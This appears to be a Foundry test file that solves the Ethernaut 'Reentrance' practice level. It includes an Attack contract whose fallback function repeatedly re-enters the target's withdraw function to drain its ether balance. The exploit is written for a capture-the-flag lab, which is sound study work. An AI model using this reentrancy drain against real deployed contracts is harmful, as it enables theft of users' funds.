// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Reentrance.sol";
import "src/levels/ReentranceFactory.sol";

contract TestReentrance is BaseTest {
    Reentrance private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new ReentranceFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = Reentrance(levelAddress);
    }

    function exploitLevel() internal override {
        vm.startPrank(address(player));

        Attack attack = new Attack{value: 0.001 ether}(address(level));

        attack.exploit();

        log_string("Execution ended");

        vm.stopPrank();
    }
}

contract Attack {
    Reentrance public reentrance;

    constructor(address payable _reentrance) public payable {
        reentrance = Reentrance(_reentrance);
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    fallback() external payable {
        uint256 balance = address(reentrance).balance;
        if (balance > 0) {
            reentrance.withdraw(0.001 ether);
            console.log("fallback executed");
        }
    }

    function exploit() external payable {
        reentrance.withdraw(0.001 ether);
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "withdraw failed");
    }
}
